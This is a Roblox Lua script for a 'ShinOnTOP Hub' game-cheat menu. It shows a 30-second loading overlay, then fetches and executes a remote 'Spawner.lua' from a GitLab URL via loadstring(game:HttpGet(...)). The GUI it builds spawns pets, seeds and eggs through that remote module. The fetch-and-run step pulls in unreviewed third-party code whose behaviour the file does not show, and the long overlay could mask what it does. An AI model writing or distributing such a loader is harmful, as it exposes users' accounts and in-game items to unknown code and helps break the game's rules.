-- ðŸŒ¸ Loading Screen First
local player = game.Players.LocalPlayer

local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.Parent = player:WaitForChild("PlayerGui")

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(255, 182, 193) -- Pink
background.BorderSizePixel = 0
background.Parent = loadingGui

local message = Instance.new("TextLabel")
message.Size = UDim2.new(1, 0, 0, 50)
message.Position = UDim2.new(0, 0, 0.5, -25)
message.BackgroundTransparency = 1
message.Text = "ðŸŒ¸ Script is now executed. Please wait..."
message.TextColor3 = Color3.fromRGB(255, 255, 255)
message.Font = Enum.Font.GothamBold
message.TextScaled = true
message.Parent = background

-- Wait 30 seconds, fade out, then show GUI
task.delay(30, function()
    for i = 1, 30 do
        background.BackgroundTransparency = i / 30
        message.TextTransparency = i / 30
        task.wait(1/30)
    end
    loadingGui:Destroy()

    -- ðŸŒ¸ ShinOnTOP Hub GUI appears after loading

    -- Load Spawner
    local success, Spawner = pcall(function()
        return loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
    end)

    if not success then
        warn("Failed to load Spawner script.")
        return
    end

    -- Create GUI
    local gui = Instance.new("ScreenGui")
    gui.Name = "ShinOnTOPHubGui"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 350, 0, 500)
    frame.Position = UDim2.new(0, 100, 0, 100)
    frame.BackgroundColor3 = Color3.fromRGB(255, 182, 193) -- Light pink
    frame.BorderSizePixel = 0
    frame.Parent = gui
    frame.Active = true
    frame.Draggable = true

    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 12)

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "ðŸŒ¸ ShinOnTOP Hub Gui"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 22
    title.TextStrokeTransparency = 0.5

    local layout = Instance.new("UIListLayout", frame)
    layout.Padding = UDim.new(0, 8)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.VerticalAlignment = Enum.VerticalAlignment.Top

    local padding = Instance.new("UIPadding", frame)
    padding.PaddingTop = UDim.new(0, 50)
    padding.PaddingLeft = UDim.new(0, 10)
    padding.PaddingRight = UDim.new(0, 10)

    local function createTextBox(placeholder)
        local box = Instance.new("TextBox")
        box.Size = UDim2.new(1, -20, 0, 30)
        box.PlaceholderText = placeholder
        box.Text = ""
        box.BackgroundColor3 = Color3.fromRGB(255, 200, 220)
        box.TextColor3 = Color3.fromRGB(50, 50, 50)
        box.Font = Enum.Font.Gotham
        box.TextSize = 14
        box.ClearTextOnFocus = false
        box.Parent = frame

        local corner = Instance.new("UICorner", box)
        corner.CornerRadius = UDim.new(0, 6)

        return box
    end

    local function createButton(text, callback)
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, -20, 0, 35)
        button.Text = text
        button.BackgroundColor3 = Color3.fromRGB(255, 105, 180)
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Font = Enum.Font.GothamBold
        button.TextSize = 16
        button.Parent = frame

        local corner = Instance.new("UICorner", button)
        corner.CornerRadius = UDim.new(0, 6)

        button.MouseButton1Click:Connect(callback)
    end

    -- Input Fields
    local petBox = createTextBox("Pet Name (e.g. Raccoon)")
    local kgBox = createTextBox("Pet KG (e.g. 1)")
    local ageBox = createTextBox("Pet Age (e.g. 2)")
    local seedBox = createTextBox("Seed Name (e.g. Candy Blossom)")
    local eggBox = createTextBox("Egg Name (e.g. Night Egg)")
    local spinBox = createTextBox("Spin Name (e.g. Sunflower)")

    -- Buttons
    createButton("Spawn Pet", function()
        local pet = petBox.Text
        local kg = tonumber(kgBox.Text) or 1
        local age = tonumber(ageBox.Text) or 1
        Spawner.SpawnPet(pet, kg, age)
    end)

    createButton("Spawn Seed", function()
        local seed = seedBox.Text
        Spawner.SpawnSeed(seed)
    end)

    createButton("Spawn Egg", function()
        local egg = eggBox.Text
        Spawner.SpawnEgg(egg)
    end)

    createButton("Spin", function()
        local spin = spinBox.Text
        Spawner.Spin(spin)
    end)

    createButton("Load Default UI", function()
        Spawner.Load()
    end)
end)
